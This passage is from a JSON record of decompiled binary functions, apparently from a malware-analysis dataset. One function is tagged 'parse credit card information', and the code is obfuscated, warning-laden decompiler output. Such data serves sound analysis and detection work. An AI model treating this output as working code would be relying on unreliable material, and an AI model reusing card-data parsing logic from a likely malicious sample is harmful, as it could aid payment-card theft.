        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403e80) overlaps instruction at (ram,0x00403e7f)\n// \n// WARNING: Removing unreachable block (ram,0x00403eb3)\n// WARNING: Removing unreachable block (ram,0x00403f71)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403d70(uchar *arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uchar *puVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint16_t uVar5;\n    int32_t in_ECX;\n    uint32_t in_EDX;\n    int16_t unaff_BX;\n    uchar *puVar6;\n    uchar *puVar7;\n    ushort in_SS;\n    uint8_t in_AF;\n    bool bVar8;\n    int16_t iStack28;\n    uint16_t uStack22;\n    int16_t iStack20;\n    \n    puVar6 = &stack0xfffffffc;\n    uStack22 = in_ECX;\n    uVar3 = (in_EAX >> 8 & 0xffff00) << 8 | in_EAX & 0xffff;\n    *arg_8h = 100;\n    iStack28 = in_EDX;\n    arg_8h[1] = 0xa9;\n    bVar8 = (iStack28 - 1U & uStack22) != 0;\n    arg_8h[2] = 0x8b;\n    if ((bVar8) && (!bVar8)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[3] = 8;\n    arg_8h[4] = 0x97;\n    arg_8h[5] = 0x89;\n    arg_8h[6] = 0xc2;\n    arg_8h[7] = 0x1a;\n    bVar8 = ((uStack22 + 1 & 0xff | (uStack22 + 1 >> 8 & (in_EAX & 0xffff) + 2U) << 8) & 0x7bc9) == 0;\n    arg_8h[8] = 0x75;\n    puVar2 = &stack0xfffffffc;\n    puVar7 = arg_8h;\n    if (bVar8) goto code_r0x00403e85;\n    puVar2 = &stack0xfffffffc;\n    if (!bVar8) goto code_r0x00403e85;\n    do {\n        uVar3 = uVar3 & 0xffffff00 | *0x4bb148d3;\n        out(*arg_8h, in_EDX);\n        puVar2 = puVar6;\n        arg_8h = arg_8h + 1;\ncode_r0x00403e85:\n        puVar6 = puVar2;\n        puVar7[9] = 0xed;\n        iStack20 = uVar3;\n        bVar8 = (POPCOUNT((iStack20 + unaff_BX | 0x11a9U) & 0xff) & 1U) == 0;\n        puVar7[10] = 0xdd;\n        puVar7[0xb] = 0x2f;\n        if ((bVar8) || (!bVar8)) {\n            puVar7[0xc] = 0x46;\n            uVar4 = uVar3;\n        }\n        else {\n            arg_8h = 0x34a96cf4;\n            puVar6 = *0xc617b43a;\n            puVar7 = puVar7 + 1;\n            uVar4 = in_EDX + 1 | 0x46;\n            in_EDX = uVar3;\n        }\n        while( true ) {\n            uVar5 = uStack22 - 1 & puVar7 | 0x61be;\n            puVar7[0xd] = 0x8b;\n            if ((0 < uVar5) && (uVar5 < 1)) break;\n            puVar7[0xe] = 0xe;\n            bVar8 = (POPCOUNT(uStack22 + 1 & 0xc9) & 1U) == 0;\n            puVar7[0xf] = 0xbf;\n            if ((bVar8) || (!bVar8)) goto code_r0x00403f50;\n            puVar1 = segment(in_SS, *0x10 + -0x10);\n            uVar4 = *puVar1;\n            in_EDX = 0xb7bc9ea5;\n            if (!bVar8) {\ncode_r0x00403f50:\n                puVar7[0x10] = 0x70;\n                **(puVar6 + 0xc) = 0x11;\n                return;\n            }\n        }\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        uVar3 = uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) + in_AF, uVar4 + in_AF * '\\x06') & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(uVar3 - 0x4f) = *(uVar3 - 0x4f);\n        unaff_BX = unaff_BX + -1;\n    } while( true );\n}\n",
        "token_count": 1259
    },
    "004044d0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a35) overlaps instruction at (ram,0x00404a33)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004044d0(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    char **ppcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint16_t uVar5;\n    uchar uVar6;\n    uchar uVar7;\n    uchar uVar8;\n    uchar uVar9;\n    uchar uVar10;\n    uchar uVar11;\n    uchar uVar12;\n    uint8_t uVar13;\n    uint16_t uVar14;\n    char *pcVar15;\n    uint32_t uVar16;\n    char extraout_CL;\n    uint8_t extraout_CH;\n    uint8_t extraout_CH_00;\n    uint16_t extraout_CX;\n    char extraout_CH_02;\n    char extraout_CH_01;\n    int32_t extraout_ECX;\n    uint16_t extraout_DX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    char extraout_DH;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t iVar17;\n    unkbyte3 unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t iVar18;\n    int32_t unaff_ESI;\n    int32_t iVar19;\n    uint32_t uVar20;\n    uint *puVar21;\n    uint32_t unaff_EDI;\n    uint8_t *puVar22;\n    uint *puVar23;\n    ushort in_SS;\n    bool in_CF;\n    bool bVar24;\n    uchar uVar25;\n    uint8_t in_AF;\n    bool bVar26;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ushort in_FPUControlWord;\n    ushort in_FPUStatusWord;\n    ushort in_FPUTagWord;\n    ushort in_FPULastInstructionOpcode;\n    uint in_FPUDataPointer;\n    uint in_FPUInstructionPointer;\n    ulong uVar27;\n    char *pcStack64;\n    uint32_t uStack60;\n    uchar uStack56;\n    ushort uStack55;\n    uchar uStack53;\n    uchar uStack52;\n    ushort uStack51;\n    uint uStack49;\n    uchar uStack45;\n    uchar uStack44;\n    ushort uStack43;\n    uchar uStack41;\n    uint8_t uStack40;\n    uint16_t uStack39;\n    uchar uStack37;\n    uint8_t uStack36;\n    uint8_t uStack35;\n    uint8_t uStack34;\n    uchar uStack33;\n    uchar uStack32;\n    uchar uStack31;\n    uchar uStack30;\n    uint uStack29;\n    uchar uStack25;\n    uchar uStack24;\n    ushort uStack23;\n    uchar uStack21;\n    uchar uStack20;\n    uchar uStack19;\n    uchar uStack18;\n    uchar uStack17;\n    uchar uStack16;\n    ushort uStack15;\n    uchar uStack13;\n    uchar uStack12;\n    ushort uStack11;\n    uchar uStack9;\n    uchar uStack8;\n    ushort uStack7;\n    uint uStack5;\n    \n    uStack8 = unaff_ESI;\n    uStack7 = unaff_ESI >> 8;\n    uStack5 = CONCAT31(unaff_EBX, unaff_ESI >> 0x18);\n    uStack12 = unaff_EDI;\n    uStack11 = unaff_EDI >> 8;\n    uStack9 = unaff_EDI >> 0x18;\n    if ((in_CF) || (!in_CF)) {\n        uStack16 = 10;\n        uStack15 = 0;\n        uStack13 = 0;\n        uStack20 = 0x34;\n        uStack19 = 0x70;\n        uStack18 = 0x40;\n        uStack17 = 0;\n        uStack24 = 0xe;\n        uStack23 = 0;\n        uStack21 = 0;\n    }\n    puVar22 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    *(param_2 + 0xe) = *(param_2 + 0xe) + (param_1 >> 8);\n    uStack25 = 0;\n    uStack32 = 0xf7;\n    uStack31 = 0x44;\n    uStack30 = 0x40;\n    uStack29 = 0x40701000;\n    fcn.004039e0();\n    uStack16 = 0x12;\n    uStack15 = 0;\n    uStack13 = 0;\n    uStack20 = 0x40;\n    uStack19 = 0x70;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xe;\n    uStack23 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x2e;\n    uStack31 = 0x45;\n    uStack30 = 0x40;\n    uStack29 = 0x40701000;\n    fcn.004039e0();\n    uStack16 = 4;\n    uStack15 = 0;\n    uStack13 = 0;\n    uStack20 = 0x54;\n    uStack19 = 0x70;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xe;\n    uStack23 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x4e;\n    uStack31 = 0x45;\n    uStack30 = 0x40;\n    uStack29 = 0x40701000;\n    fcn.004039e0();\n    uStack16 = 0xc;\n    uStack15 = 0;\n    uStack13 = 0;\n    uStack20 = 0x58;\n    uStack19 = 0x70;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xe;\n    uStack23 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x6f;\n    uStack31 = 0x45;\n    uStack30 = 0x40;\n    uStack29 = 0x40701000;\n    fcn.004039e0();\n    bVar24 = false;\n    uStack16 = 7;\n    uStack15 = 0;\n    uStack13 = 0;\n    uStack20 = 100;\n    uStack19 = 0x70;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xe;\n    uStack23 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x8a;\n    uStack31 = 0x45;\n    uStack30 = 0x40;\n    uStack29._1_3_ = 0x407010;\n    uStack29._0_1_ = 0;\n    uVar13 = fcn.004039e0();\n    if (bVar24) {\ncode_r0x004045a2:\n        uStack32 = 0xb;\n        uStack31 = 0;\n        uStack30 = 0;\n        uStack29._0_1_ = 0;\n    }\n    else {\n        uStack30 = SUB41(puVar22, 0);\n        uStack29._0_1_ = puVar22 >> 8;\n        puVar22 = puVar22 & 0xffff0000 | puVar22 & 0xff | uStack29 << 8;\n        if (!bVar24) goto code_r0x004045a2;\n    }\n    puVar21 = puVar22 + 1;\n    cVar3 = uVar13 - *puVar22;\n    iVar18 = (cVar3 < '\\0') * 0x80;\n    uStack35 = (in_NT & 1) * 0x4000 >> 8 | SBORROW1(uVar13, *puVar22) * 0x800 >> 8 | (in_IF & 1) * 0x200 >> 8 |\n               (in_TF & 1) * 0x100 >> 8 | iVar18 >> 8;\n    uStack36 = iVar18 | (cVar3 == '\\0') * '@' | (in_AF & 1) * '\\x10' | ((POPCOUNT(cVar3) & 1U) == 0) * '\\x04' |\n               uVar13 < *puVar22;\n    uStack34 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n               (in_AC & 1) * 0x40000 >> 0x10;\n    uStack33 = 0;\n    iVar19 = unaff_ESI + -1;\n    uStack40 = 0x9c;\n    uStack39 = 0x4045;\n    uStack37 = 0;\n    uVar27 = func_0x1018a514();\n    bVar24 = (POPCOUNT(*(uVar27 + -0x7f +\n                        ((unaff_EBP + 0x680a6a76U >> 8 & 0xffff00) << 8 | unaff_EBP + 0x680a6a76U & 0xffff)) & 0x4b) &\n             1U) == 0;\n    iVar18 = (uVar27 >> 0x20) + 0xb;\n    uStack40 = 0x6c;\n    uStack39 = 0x4070;\n    uStack37 = 0;\n    uStack44 = 0xe;\n    uStack43 = 0;\n    uStack41 = 0;\n    uStack45 = 0;\n    uStack52 = 0xb5;\n    uStack51 = 0x4045;\n    uStack49._1_3_ = 0x407010;\n    uStack49._0_1_ = 0;\n    uVar27 = fcn.004039e0();\n    iVar17 = uVar27 >> 0x20;\n    if (bVar24) {\ncode_r0x004045cc:\n        uStack52 = 0xc;\n        uStack51 = 0;\n        uStack49._0_1_ = 0;\n        uStack56 = 0x78;\n        uStack55 = 0x4070;\n        uStack53 = 0;\n        uStack60 = 0xe;\ncode_r0x004045d1:\n        puVar22 = iVar17 + 0xe;\n        uVar25 = CARRY1(*puVar22, extraout_CH);\n        *puVar22 = *puVar22 + extraout_CH;\n        bVar24 = *puVar22 == 0;\n        pcStack64 = str.h__1;\n        fcn.004039e0();\n        if ((bVar24) || (!bVar24)) {\ncode_r0x004045f5:\n            *(extraout_EDX + 8) = *(extraout_EDX + 8) ^ extraout_CH_00;\n            fcn.004039e0();\n            puVar23 = puVar21;\n            goto code_r0x00404625;\n        }\n        puVar23 = puVar21 + 1;\n        uVar1 = in(extraout_EDX);\n        *puVar21 = uVar1;\n        puVar21 = puVar23;\n        if (0 < &stack0xffffffc0) goto code_r0x004045f5;\n    }\n    else {\n        uStack52 = SUB41(puVar21, 0);\n        uStack51 = puVar21 >> 8;\n        uStack49._0_1_ = puVar21 >> 0x18;\n        puVar21 = puVar21 & 0xffffff | uStack49 << 0x18;\n        if (!bVar24) goto code_r0x004045cc;\n        iVar19 = 0x34a96cf4;\n        iVar18 = *0x6a17b43a;\n        iVar17 = uVar27;\n        if (-1 < ((uVar27 >> 0x20) + 1U | 0x68)) goto code_r0x004045d1;\n        in(uVar27);\n        puVar23 = puVar21;\ncode_r0x00404625:\n        uStack20 = 0xd;\n        uStack19 = 0;\n        uStack18 = 0;\n        uStack17 = 0;\n        uStack24 = 0x8c;\n        uStack23 = 0x4070;\n        uStack21 = 0;\n        uStack25 = 0;\n        uStack32 = 0x10;\n        uStack31 = 0x70;\n        uStack30 = 0x40;\n        uStack29 = 0xe00;\n        uStack36 = 0x38;\n        uStack35 = 0x46;\n        uStack34 = 0x40;\n        uStack33 = 0;\n        fcn.004039e0();\n        uStack40 = iVar18;\n        uStack39 = iVar18 >> 8;\n        uStack37 = iVar18 >> 0x18;\n        uStack44 = iVar19;\n        uStack43 = iVar19 >> 8;\n        uStack41 = iVar19 >> 0x18;\n        uStack49._1_3_ = SUB43(puVar23, 0);\n        uStack45 = puVar23 >> 0x18;\n        uStack20 = 0x18;\n        uStack19 = 0;\n        uStack18 = 0;\n        uStack17 = 0;\n        uStack24 = 0x9c;\n        uStack23 = 0x4070;\n        uStack21 = 0;\n        uStack25 = 0;\n        uStack32 = 0x10;\n        uStack31 = 0x70;\n        uStack30 = 0x40;\n        uStack29 = 0xe00;\n        uStack36 = 0x5a;\n        uStack35 = 0x46;\n        uStack34 = 0x40;\n        uStack33 = 0;\n        fcn.004039e0();\n        uVar25 = 0;\n    }\n    uStack20 = 0x25;\n    uStack19 = 0;\n    uStack18 = 0;\n    uStack17 = 0;\n    uStack24 = 0xb4;\n    uStack23 = 0x4070;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x10;\n    uStack31 = 0x70;\n    uStack30 = 0x40;\n    uStack29 = 0xe00;\n    uStack36 = 0x7b;\n    uStack35 = 0x46;\n    uStack34 = 0x40;\n    uStack33 = 0;\n    uVar13 = fcn.004039e0();\n    if (!uVar25) {\n        uStack34 = puVar23;\n        uStack33 = puVar23 >> 8;\n        if (uVar25) goto code_r0x00404683;\n    }\n    uStack36 = 10;\n    uStack35 = 0;\n    uStack34 = 0;\n    uStack33 = 0;\ncode_r0x00404683:\n    puVar22 = puVar23 + 1;\n    cVar3 = uVar13 - *puVar23;\n    iVar18 = (cVar3 < '\\0') * 0x80;\n    uStack40 = iVar18 | (cVar3 == '\\0') * '@' | (in_AF & 1) * '\\x10' | ((POPCOUNT(cVar3) & 1U) == 0) * '\\x04' |\n               uVar13 < *puVar23;\n    uStack39 = (in_NT & 1) * 0x4000 >> 8 | SBORROW1(uVar13, *puVar23) * 0x800 >> 8 | (in_IF & 1) * 0x200 >> 8 |\n               (in_TF & 1) * 0x100 >> 8 | iVar18 >> 8 | (in_ID & 1) * 0x2000 | (in_VIP & 1) * 0x1000 |\n               (in_VIF & 1) * 0x800 | (in_AC & 1) * 0x400;\n    uStack37 = 0;\n    uVar20 = iVar19 - 1;\n    uStack44 = 0x8d;\n    uStack43 = 0x4046;\n    uStack41 = 0;\n    func_0x1018a605();\n    iVar18 = extraout_EDX_00 + 10;\n    uStack44 = 0xdc;\n    uStack43 = 0x4070;\n    uStack41 = 0;\n    uStack45 = 0;\n    uStack52 = 0x10;\n    uStack51 = 0x4070;\n    uStack49 = 0xe00;\n    uStack56 = 0xa6;\n    uStack55 = 0x4046;\n    uStack53 = 0;\n    fcn.004039e0();\n    bVar24 = false;\n    bVar26 = (((extraout_CX & 0x4ed ^ 0x3f6f) >> 8) + extraout_DH & 0x5bU) == 0;\n    uStack24 = 0xc;\n    uStack23 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0xe;\n    uStack31 = 0;\n    uStack30 = 0;\n    uStack29 = 0x4070e800;\n    uStack36 = 0x10;\n    uStack35 = 0x70;\n    uStack34 = 0x40;\n    uStack33 = 0;\n    uStack40 = 0xdc;\n    uStack39 = 0x4046;\n    uStack37 = 0;\n    fcn.004039e0();\n    if ((!bVar24 && !bVar26) && (bVar24 || bVar26)) {\n        uVar20 = CONCAT13(uStack33, CONCAT12(uStack34, CONCAT11(uStack35, uStack36)));\n    }\n    uStack37 = 0xd;\n    uStack36 = 0;\n    uStack35 = 0;\n    uStack34 = 0;\n    uStack41 = 0xf4;\n    uStack40 = 0x70;\n    uStack39 = 0x40;\n    uStack45 = 0xe;\n    uStack44 = 0;\n    uStack43 = 0;\n    uStack49 = str.h__1;\n    uStack53 = 6;\n    uStack52 = 0x47;\n    uStack51 = 0x40;\n    fcn.004039e0();\n    bVar24 = 0xffffffdf < &stack0xffffffcf;\n    uStack41 = iVar18;\n    uStack40 = iVar18 >> 8;\n    uStack39 = iVar18 >> 0x10;\n    uStack45 = uVar20;\n    uVar25 = uStack45;\n    uStack44 = uVar20 >> 8;\n    uVar6 = uStack44;\n    uStack43 = uVar20 >> 0x10;\n    uStack21 = 6;\n    uStack20 = 0;\n    uStack19 = 0;\n    uStack18 = 0;\n    uStack25 = 4;\n    uStack24 = 0x71;\n    uStack23 = 0x40;\n    uStack29 = 0xe;\n    uStack33 = 0x10;\n    uStack32 = 0x70;\n    uStack31 = 0x40;\n    uStack30 = 0;\n    uStack37 = 0x24;\n    uStack36 = 0x47;\n    uStack35 = 0x40;\n    uStack34 = 0;\n    uStack49 = puVar22;\n    fcn.004039e0();\n    if ((bVar24) || (!bVar24)) {\n        uStack45 = 0xe;\n        uStack44 = 0;\n        uStack43 = 0;\n    }\n    *(uVar20 + 0x43d1773a) = *(uVar20 + 0x43d1773a) ^ 0x6a27e95e;\n    *(extraout_EDX_01 + 0xe) = *(extraout_EDX_01 + 0xe) + extraout_CH_01;\n    uStack37 = 0x10;\n    uStack36 = 0x70;\n    uStack35 = 0x40;\n    uStack34 = 0;\n    uStack41 = 0x50;\n    uStack40 = 0x47;\n    uStack39 = 0x40;\n    fcn.004039e0();\n    uStack9 = 0xd;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x14;\n    uStack12 = 0x71;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 0x6b;\n    uStack24 = 0x47;\n    uStack23 = 0x40;\n    fcn.004039e0();\n    uStack9 = 0x19;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x24;\n    uStack12 = 0x71;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 0xa2;\n    uStack24 = 0x47;\n    uStack23 = 0x40;\n    fcn.004039e0();\n    uStack25 = 0xf;\n    uStack24 = 0;\n    uStack23 = 0;\n    uStack29 = 0x407140;\n    uStack33 = 0xe;\n    uStack32 = 0;\n    uStack31 = 0;\n    uStack30 = 0;\n    uStack37 = 0x10;\n    uStack36 = 0x70;\n    uStack35 = 0x40;\n    uStack34 = 0;\n    uStack41 = 0xc1;\n    uStack40 = 0x47;\n    uStack39 = 0x40;\n    uVar14 = fcn.004039e0();\n    uVar14 = ((uVar14 & 0xff | (uVar14 >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^\n             (extraout_DX & 0xff | (extraout_DX >> 8 | extraout_DX) << 8);\n    bVar24 = uVar14 < 0x4001;\n    bVar26 = uVar14 == 0x4001;\n    uStack9 = 0xe;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x50;\n    uStack12 = 0x71;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 0xee;\n    uStack24 = 0x47;\n    uStack23 = 0x40;\n    fcn.004039e0();\n    if ((!bVar24 && !bVar26) && (bVar24 || bVar26)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uStack25 = 0xb;\n    uStack24 = 0;\n    uStack23 = 0;\n    uStack29 = 0x407160;\n    uStack33 = 0xe;\n    uStack32 = 0;\n    uStack31 = 0;\n    uStack30 = 0;\n    uStack37 = 0x10;\n    uStack36 = 0x70;\n    uStack35 = 0x40;\n    uStack34 = 0;\n    uStack41 = 0xb;\n    uStack40 = 0x48;\n    uStack39 = 0x40;\n    fcn.004039e0();\n    uStack9 = 0xb;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x6c;\n    uStack12 = 0x71;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 0x3b;\n    uStack24 = 0x48;\n    uStack23 = 0x40;\n    fcn.004039e0();\n    uStack31 = uVar20 >> 0x10;\n    uVar11 = uStack31;\n    uStack30 = uVar20 >> 0x18;\n    uVar12 = uStack30;\n    uStack37 = SUB41(puVar22, 0);\n    uVar7 = uStack37;\n    uStack36 = puVar22 >> 8;\n    uVar8 = uStack36;\n    uStack35 = puVar22 >> 0x10;\n    uVar9 = uStack35;\n    uStack34 = puVar22 >> 0x18;\n    uVar10 = uStack34;\n    uStack9 = 0xb;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x78;\n    uStack12 = 0x71;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 100;\n    uStack24 = 0x48;\n    uStack23 = 0x40;\n    uStack33 = uVar25;\n    uStack32 = uVar6;\n    uStack29 = iVar18;\n    fcn.004039e0();\n    uStack9 = 10;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x84;\n    uStack12 = 0x71;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 0x82;\n    uStack24 = 0x48;\n    uStack23 = 0x40;\n    uStack37 = uVar7;\n    uStack36 = uVar8;\n    uStack35 = uVar9;\n    uStack34 = uVar10;\n    uStack33 = uVar25;\n    uStack32 = uVar6;\n    uStack31 = uVar11;\n    uStack30 = uVar12;\n    uStack29 = iVar18;\n    fcn.004039e0();\n    uStack9 = 0xc;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x90;\n    uStack12 = 0x71;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 0xa7;\n    uStack24 = 0x48;\n    uStack23 = 0x40;\n    fcn.004039e0();\n    uStack9 = 0xe;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x9c;\n    uStack12 = 0x71;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 0xd2;\n    uStack24 = 0x48;\n    uStack23 = 0x40;\n    fcn.004039e0();\n    uStack9 = 0x11;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0xac;\n    uStack12 = 0x71;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 0xf3;\n    uStack24 = 0x48;\n    uStack23 = 0x40;\n    fcn.004039e0();\n    uStack33 = uVar20 & 0xffff;\n    uStack32 = (uVar20 & 0xffff) >> 8;\n    uStack31 = (uVar20 & 0xffff0000) >> 0x10;\n    uStack30 = (uVar20 & 0xffff0000) >> 0x18;\n    uStack37 = puVar22 & 0xffff;\n    uStack36 = (puVar22 & 0xffff) >> 8;\n    uStack35 = (puVar22 & 0xffff0000) >> 0x10;\n    uStack34 = (puVar22 & 0xffff0000) >> 0x18;\n    uStack29 = iVar18;\n    do {\n        iVar18 = uStack29;\n        uVar14 = CONCAT11(uStack36, uStack37);\n        uVar20 = CONCAT13(uStack34, CONCAT12(uStack35, uVar14));\n        uVar5 = CONCAT11(uStack32, uStack33);\n        uVar4 = CONCAT13(uStack30, CONCAT12(uStack31, uVar5));\n        uStack9 = 0x13;\n        uStack8 = 0;\n        uStack7 = 0;\n        uStack13 = 0xc0;\n        uStack12 = 0x71;\n        uStack11 = 0x40;\n        uStack17 = 0xe;\n        uStack16 = 0;\n        uStack15 = 0;\n        uStack21 = 0x10;\n        uStack20 = 0x70;\n        uStack19 = 0x40;\n        uStack18 = 0;\n        uStack25 = 0x1c;\n        uStack24 = 0x49;\n        uStack23 = 0x40;\n        fcn.004039e0();\n        bVar24 = false;\n        uVar25 = 0;\n        bVar26 = (POPCOUNT(extraout_CL - 5U & 0x44) & 1U) == 0;\n        uStack9 = 0x14;\n        uStack8 = 0;\n        uStack7 = 0;\n        uStack13 = 0xd4;\n        uStack12 = 0x71;\n        uStack11 = 0x40;\n        uStack17 = 0xe;\n        uStack16 = 0;\n        uStack15 = 0;\n        uStack21 = 0x10;\n        uStack20 = 0x70;\n        uStack19 = 0x40;\n        uStack18 = 0;\n        uStack25 = 0x57;\n        uStack24 = 0x49;\n        uStack23 = 0x40;\n        fcn.004039e0();\n        if ((bVar26) || (!bVar26)) goto code_r0x0040497b;\n        ppcVar2 = segment(in_SS, *0x10 + -0x15);\n        pcVar15 = *ppcVar2;\n        if (bVar24) {\n            *pcVar15 = *pcVar15 + pcVar15;\n            *(extraout_ECX + -0x55) = *(extraout_ECX + -0x55) + (pcVar15 >> 8);\n            return;\n        }\n    } while (bVar26);\n    uVar25 = 0;\n    uStack21 = 0xa5;\n    uStack20 = 0x9e;\n    uStack19 = 0xbc;\n    uStack18 = 0xb7;\ncode_r0x0040497b:\n    uStack25 = 0x33;\n    uStack24 = 0;\n    uStack23 = 0;\n    uStack29 = 0x4071e8;\n    uStack33 = 0xe;\n    uStack32 = 0;\n    uStack31 = 0;\n    uStack30 = 0;\n    uStack37 = 0x10;\n    uStack36 = 0x70;\n    uStack35 = 0x40;\n    uStack34 = 0;\n    uStack41 = 0x8e;\n    uStack40 = 0x49;\n    uStack39 = 0x40;\n    fcn.004039e0();\n    if ((!uVar25) && (uVar25)) {\n        *CONCAT13(uStack34, CONCAT12(uStack35, CONCAT11(uStack36, uStack37))) =\n             CONCAT22(uStack7, CONCAT11(uStack8, uStack9));\n        return;\n    }\n    uStack41 = 10;\n    uStack40 = 0;\n    uStack39 = 0;\n    uStack45 = 0x1c;\n    uStack44 = 0x72;\n    uStack43 = 0x40;\n    uStack49 = 0xe;\n    uStack53 = 0x10;\n    uStack52 = 0x70;\n    uStack51 = 0x40;\n    uStack60 = uStack60 & 0xffffff | 0xc1000000;\n    uStack56 = 0x49;\n    uStack55 = 0x40;\n    uVar16 = fcn.004039e0();\n    bVar24 = uVar20 < uVar16;\n    bVar26 = SBORROW4(uVar20, uVar16);\n    puVar21 = uVar4 & 0xffff0000 | uVar5;\n    puVar23 = uVar20 & 0xffff0000 | uVar14;\n    uStack9 = 4;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack13 = 0x28;\n    uStack12 = 0x72;\n    uStack11 = 0x40;\n    uStack17 = 0xe;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0x10;\n    uStack20 = 0x70;\n    uStack19 = 0x40;\n    uStack18 = 0;\n    uStack25 = 0xe1;\n    uStack24 = 0x49;\n    uStack23 = 0x40;\n    fcn.004039e0();\n    if ((bVar26) || (!bVar26)) {\n        uStack33 = 0xe;\n        uStack32 = 0;\n        uStack31 = 0;\n        uStack30 = 0;\n        iVar17 = extraout_EDX_02;\n    }\n    else {\n        *puVar23 = *puVar21;\n        iVar17 = 0x2c68056a;\n        puVar21 = puVar21 + 1;\n        puVar23 = puVar23 + 1;\n        if (bVar24) {\n            *0x2c68056a = in_FPUControlWord;\n            *0x2c68056e = in_FPUStatusWord;\n            *0x2c680572 = in_FPUTagWord;\n            *0x2c680576 = in_FPUInstructionPointer;\n            *0x2c68057c = in_FPULastInstructionOpcode;\n            *0x2c68057e = in_FPUDataPointer;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    *(iVar17 + 0xe) = *(iVar17 + 0xe) + extraout_CH_02;\n    uStack25 = 0x10;\n    uStack24 = 0x70;\n    uStack23 = 0x40;\n    uStack29 = 0x404a02;\n    fcn.004039e0();\n    uStack17 = iVar18;\n    uStack16 = iVar18 >> 8;\n    uStack15 = iVar18 >> 0x10;\n    uStack21 = SUB41(puVar21, 0);\n    uStack20 = puVar21 >> 8;\n    uStack19 = puVar21 >> 0x10;\n    uStack18 = puVar21 >> 0x18;\n    uStack25 = SUB41(puVar23, 0);\n    uStack24 = puVar23 